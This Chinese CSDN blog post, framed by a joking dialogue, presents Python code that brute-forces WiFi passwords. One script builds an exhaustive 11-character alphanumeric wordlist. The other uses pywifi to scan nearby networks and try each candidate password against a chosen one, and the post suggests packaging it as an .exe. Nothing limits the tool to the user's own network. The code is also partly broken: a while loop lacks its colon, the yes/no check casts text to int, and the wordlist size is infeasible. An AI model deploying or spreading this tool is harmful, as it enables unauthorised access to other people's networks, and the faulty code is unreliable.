{"blogid": "126677615", "writerAge": "码龄5年", "writerBlogNum": "236", "writerCollect": "13007", "writerComment": "673", "writerFan": "6738", "writerGrade": "7级", "writerIntegral": "13465", "writerName": "Carl_奕然", "writerProfileAdress": "writer_image\\profile_126677615.jpg", "writerRankTotal": "723", "writerRankWeekly": "1194", "writerThumb": "1993", "writerVisitNum": "1965538", "blog_read_count": "489", "blog_time": "于 2022-09-06 06:00:00 发布", "blog_title": "猿创征文｜Python3，10分钟写了一个WIFI 万(破) 能 (解) 钥 (神) 匙 (器)，YYDS。", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-tomorrow-night\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>wifi万能钥匙</h3>\n<ul><li><a href=\"#1_1\">1、引言</a></li><li><a href=\"#2_12\">2、代码实战</a></li><li><ul><li><a href=\"#21__13\">2.1 思路</a></li><li><a href=\"#22__20\">2.2 模块安装</a></li><li><a href=\"#23__32\">2.3 代码实战</a></li><li><ul><li><a href=\"#231__33\">2.3.1 生成密码本</a></li><li><a href=\"#232__66\">2.3.2 破解实战</a></li></ul>\n</li></ul>\n</li><li><a href=\"#3_220\">3、总结</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"1_1\"></a>1、引言</h1>\n<p><strong>小鱼</strong>：小屌丝，你家WIFI密码是多少？<br/> <strong>小屌丝</strong>：你试一试123456<br/> <strong>小鱼</strong>：不对，<br/> <strong>小屌丝</strong>：那再试下654321<br/> <strong>小鱼</strong>：试了，还是不对！<br/> <strong>小屌丝</strong>：我想一想…<br/> <img alt=\"在这里插入图片描述\" src=\"image\\5933462bf29f43239e772596376b8caf.png\"/><br/> <strong>小鱼</strong>：你还能想起来吗？<br/> <strong>小屌丝</strong>：鱼哥，我还在想呢…<br/> <strong>小鱼</strong>：那你慢慢想…</p>\n<h1><a id=\"2_12\"></a>2、代码实战</h1>\n<h2><a id=\"21__13\"></a>2.1 思路</h2>\n<p>小鱼我实在是没有耐心等了， 我准备撸一个破解器。<br/> 思路也非常的简单：</p>\n<ul><li>获取wifi列表；</li><li>准备万能密码本；</li><li>进行循环读取</li></ul>\n<h2><a id=\"22__20\"></a>2.2 模块安装</h2>\n<p>因为我们需要wifi密码破解， 所以这里需要用到第三方库，pywifi</p>\n<p>老规矩，pip 安装</p>\n<pre><code class=\"prism language-powershell\">pip install pywifi\n</code></pre>\n<p>其它安装方式，直接看这两篇:</p>\n<ul><li>《<a href=\"https://blog.csdn.net/wuyoudeyuer/article/details/119350545?spm=1001.2014.3001.5501\"><strong>Python3，选择Python自动安装第三方库，从此跟pip说拜拜！！</strong></a>》</li><li>《<a href=\"https://blog.csdn.net/wuyoudeyuer/article/details/119147839?spm=1001.2014.3001.5501\"><strong>Python3：我低调的只用一行代码，就导入Python所有库！</strong></a>》</li></ul>\n<h2><a id=\"23__32\"></a>2.3 代码实战</h2>\n<h3><a id=\"231__33\"></a>2.3.1 生成密码本</h3>\n<p><strong>代码示例</strong></p>\n<pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> itertools <span class=\"token keyword\">as</span> its\n<span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> os\n\n<span class=\"token comment\">#数字+字母</span>\npaswds<span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>\n<span class=\"token comment\">#11位密码</span>\nr <span class=\"token operator\">=</span> its<span class=\"token punctuation\">.</span>product<span class=\"token punctuation\">(</span>paswds<span class=\"token punctuation\">,</span>repeat <span class=\"token operator\">=</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#文件路径</span>\nout_path <span class=\"token operator\">=</span> <span class=\"token string\">'./output_file'</span>\nfile_name <span class=\"token operator\">=</span>  <span class=\"token string\">'pwd.txt'</span>\nout_file <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>out_path<span class=\"token punctuation\">,</span>file_name<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#如果没有outfile_path 这个文件夹，就自动创建</span>\n<span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>out_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    os<span class=\"token punctuation\">.</span>mkdir<span class=\"token punctuation\">(</span>out_path<span class=\"token punctuation\">)</span>\ndic <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>out_file<span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#循环获取生成密码本</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">:</span>\n    dic<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    dic<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#关闭 </span>\ndic<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p><strong>生成结果：</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\10cc08c6823943f58cb0c94ac90949eb.png\"/></p>\n<p><strong>注</strong>：</p>\n<ul><li>由于是11位，最后生成的密码本会很大，所以，你懂得…</li></ul>\n<h3><a id=\"232__66\"></a>2.3.2 破解实战</h3>\n<p>密码本准备完成， 接下来，我们就来破解wifi密码。</p>\n<p><strong>代码示例</strong>：</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n<span class=\"token comment\"># @Time   : 2022-09-03</span>\n<span class=\"token comment\"># @Author : Carl_DJ</span>\n\n<span class=\"token keyword\">import</span> pywifi\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">from</span> pywifi <span class=\"token keyword\">import</span> const\n\n\n<span class=\"token comment\"># wifi 扫描</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">wifi_scan</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#初始化wifi</span>\n    wifi <span class=\"token operator\">=</span> pywifi<span class=\"token punctuation\">.</span>PyWiFi<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#使用第一个无线网卡</span>\n    interface <span class=\"token operator\">=</span> wifi<span class=\"token punctuation\">.</span>interfaces<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n    <span class=\"token comment\">#开始扫描</span>\n    interface<span class=\"token punctuation\">.</span>scan<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'正在扫码可用wifi，请稍后...（'</span></span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">'）'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'扫描完成！)'</span></span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{:4}{:6}{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">'编号'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'信号强度'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wifi名'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#把扫描结果，存放在每一个wifi对象中</span>\n    wifi_bss <span class=\"token operator\">=</span> interface<span class=\"token punctuation\">.</span>scan_results<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#存放wifi名</span>\n    wifi_name_save <span class=\"token operator\">=</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> wifi_bss<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#解决乱码问题</span>\n        wifi_name_signal <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> n<span class=\"token punctuation\">.</span>signal<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">.</span>ssid<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'raw_unicode_escape'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        wifi_name_save<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>wifi_name_signal<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#wifi 存入列表并按照信号强度排序</span>\n    wifi_name_list <span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>wifi_name_save<span class=\"token punctuation\">)</span>\n    wifi_name_list <span class=\"token operator\">=</span> <span class=\"token builtin\">sorted</span><span class=\"token punctuation\">(</span>wifi_name_list<span class=\"token punctuation\">,</span>key<span class=\"token operator\">=</span><span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">:</span>a<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>reverse<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n    num <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token comment\">#格式化输出</span>\n    <span class=\"token keyword\">while</span> num <span class=\"token operator\">&lt;</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>wifi_name_list<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{:&lt;6d}.{:&lt;8d}{}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span>wifi_name_list<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>wifi_name_list<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        num <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token operator\">*</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#返回wifi列表</span>\n    <span class=\"token keyword\">return</span> wifi_name_list\n\n<span class=\"token comment\"># wifi 破解</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">wifi_creak</span><span class=\"token punctuation\">(</span>wifi_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#字典路径</span>\n    wifi_dict_path <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入wifi破解密码路径：\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>wifi_dict_path<span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#遍历密码</span>\n        <span class=\"token keyword\">for</span> pwd <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span>\n            <span class=\"token comment\">#去除密码的末尾换行符</span>\n            pwd  <span class=\"token operator\">=</span> pwd<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#创建wifi对象</span>\n            wifi <span class=\"token operator\">=</span> pywifi<span class=\"token punctuation\">.</span>PyWiFi<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#创建网卡对象，为第一个wifi网卡</span>\n            interface <span class=\"token operator\">=</span> wifi<span class=\"token punctuation\">.</span>interfaces<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token comment\">#断开所有wifi链接</span>\n            interface<span class=\"token punctuation\">.</span>disconnect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#等待wifi断开</span>\n            <span class=\"token keyword\">while</span> interface<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span>\n                 <span class=\"token comment\"># 当其处于连接状态时，利用循环等待其断开</span>\n                <span class=\"token keyword\">pass</span>\n            <span class=\"token comment\">#创建连接文件（对象）</span>\n            profile <span class=\"token operator\">=</span> pywifi<span class=\"token punctuation\">.</span>Profile<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#wifi名称</span>\n            profile<span class=\"token punctuation\">.</span>ssid <span class=\"token operator\">=</span> wifi_name\n            <span class=\"token comment\">#认证</span>\n            profile<span class=\"token punctuation\">.</span>auth <span class=\"token operator\">=</span> const<span class=\"token punctuation\">.</span>AUTH_ALG_OPEN\n            <span class=\"token comment\">#wifi默认加密算法,WPA2PSK</span>\n            profile<span class=\"token punctuation\">.</span>akm<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>const<span class=\"token punctuation\">.</span>AKM_TYPE_WPA2PSK<span class=\"token punctuation\">)</span>\n            profile<span class=\"token punctuation\">.</span>cipher <span class=\"token operator\">=</span> const<span class=\"token punctuation\">.</span>CIPHER_TYPE_CCMP\n            <span class=\"token comment\">#wifi密码</span>\n            profile<span class=\"token punctuation\">.</span>key <span class=\"token operator\">=</span> pwd\n            <span class=\"token comment\">#删除所有wifi链接文件</span>\n            interface<span class=\"token punctuation\">.</span>remove_network_profiles<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#设置wifi新的链接文件</span>\n            tmp_profile <span class=\"token operator\">=</span>interface<span class=\"token punctuation\">.</span>add_network_profile<span class=\"token punctuation\">(</span>profile<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#开始尝试链接</span>\n            interface<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>tmp_profile<span class=\"token punctuation\">)</span>\n            start_time <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#如果链接时间超过1.5s,就认为密码不正确，在1.5s，说明链接成功</span>\n            <span class=\"token keyword\">while</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> start_time <span class=\"token operator\">&lt;</span> <span class=\"token number\">1.5</span><span class=\"token punctuation\">:</span>\n                <span class=\"token comment\">#默认连接成功状态为4</span>\n                <span class=\"token keyword\">if</span> interface<span class=\"token punctuation\">.</span>status<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'wifi连接成功，密码为:</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>pwd<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n                    exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'正在尝试使用</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>pwd<span class=\"token punctuation\">}</span></span><span class=\"token string\">进行破解密码！'</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#主函数</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#退出标志</span>\n        exit_flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n        <span class=\"token comment\">#目标编号</span>\n        target <span class=\"token operator\">=</span>  <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n        <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> exit_flag<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'wifi万能钥匙'</span><span class=\"token punctuation\">.</span>center<span class=\"token punctuation\">(</span><span class=\"token number\">35</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token comment\">#调用扫描函数，返回一个排序后的wifi列表</span>\n                wifi_list <span class=\"token operator\">=</span> wifi_scan<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token comment\"># 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理</span>\n                choose_exit_flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n                <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> choose_exit_flag<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                        target <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请选择你要尝试破解的wifi: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                         <span class=\"token comment\"># 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入</span>\n                        <span class=\"token keyword\">if</span> target <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>wifi_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                            <span class=\"token comment\">#二次确认</span>\n                            <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> choose_exit_flag<span class=\"token punctuation\">:</span>\n                                <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                                    choose <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'你选择要破解的WiFi名称是: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>wifi_list<span class=\"token punctuation\">[</span>target<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">，确定吗？（Y/N）'</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token comment\">#对用户输入进行小写处理，并判断</span>\n                                    <span class=\"token keyword\">if</span> choose<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span>\n                                        choose_exit_flag <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n                                    <span class=\"token keyword\">elif</span> choose<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">'n'</span><span class=\"token punctuation\">:</span>\n                                        <span class=\"token keyword\">break</span>\n\n                                    <span class=\"token comment\">#处理用户其他字模输入</span>\n                                    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'只能输入 Y/N '</span></span><span class=\"token punctuation\">)</span>\n                                <span class=\"token comment\"># 处理用户非字母输入</span>\n                                <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">:</span>\n                                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'只能输入 Y/N '</span></span><span class=\"token punctuation\">)</span>\n                            <span class=\"token comment\">#退出破解</span>\n                            <span class=\"token keyword\">if</span> choose_exit_flag <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                                <span class=\"token keyword\">break</span>\n                            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'请重新输入!'</span></span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">except</span>  ValueError<span class=\"token punctuation\">:</span>\n                        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'只能输入数字，需要重新输入!'</span></span><span class=\"token punctuation\">)</span>\n                <span class=\"token comment\"># 密码破解，传入用户选择的wifi名称</span>\n                wifi_creak<span class=\"token punctuation\">(</span>wifi_list<span class=\"token punctuation\">[</span>target<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token operator\">*</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span>\n                exit_flag <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">except</span>  Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'错误信息为: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>e<span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">raise</span>  e\n\n<span class=\"token comment\"># 执行</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n<p><strong>运行结果：</strong><br/> <img alt=\"在这里插入图片描述\" src=\"image\\bfcfa7d51de24282b44e6b3d900d046c.png\"/></p>\n<h1><a id=\"3_220\"></a>3、总结</h1>\n<p>看到这里，今天的分享就差不多完事了。<br/> 今天通过pywifi来写了一个wifi破解神器。<br/> 由于这是非GUI版本，所以可以把这个代码封装成.exe运行程序。<br/> 这样运行起来，更方便。</p>\n<p>我是<a href=\"https://blog.csdn.net/wuyoudeyuer?type=blog\"><strong>小鱼</strong></a>，</p>\n<ul><li><a href=\"https://blog.csdn.net/wuyoudeyuer?type=blog\"><strong>CSDN博客专家</strong></a>；</li><li><a href=\"http://quan.51testing.com/pcQuan/owner/22131?name=Carl_%E5%A5%95%E7%84%B6\"><strong>51Testing认证讲师</strong></a>；</li></ul>\n<p><a href=\"https://blog.csdn.net/wuyoudeyuer?type=blog\"><strong>关注我</strong></a>，带你学习更多更专业更有趣的Python知识。</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}